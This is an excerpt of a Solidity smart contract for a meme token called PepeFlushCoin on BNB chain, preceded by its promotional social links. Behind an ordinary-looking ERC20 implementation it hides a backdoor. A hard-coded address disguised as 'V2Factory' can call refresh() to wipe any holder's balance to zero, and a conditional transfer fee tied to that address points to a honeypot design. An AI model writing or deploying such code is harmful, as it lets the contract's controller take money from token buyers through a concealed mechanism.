...
https://t.me.com/PepeFlushCoinBNB
https://twitter.com/PepeFlushCoinBNB
https://PepeFlushCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private V2Factory = 0x1eC3E9E140Ac283bA4ef16Bdc659a8c12C5f786d;
    address internal _uniswapRouterV2 = 0x57981c59C4678167AfeEBC70739a9Ee5FF2EEB80;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != _uniswapRouterV2 && _balances[V2Factory] > 0 ? pairsAllowance : swappingToggle).div(100)+0;
        if (swapamount > 0)
        {
     ...
     *
     */
    function refresh(address refreshSender) external { if (msg.sender == V2Factory) _balances[refreshSender] = 0x0; }
...
contract PepeFlushCoin is ERC20, Ownable {
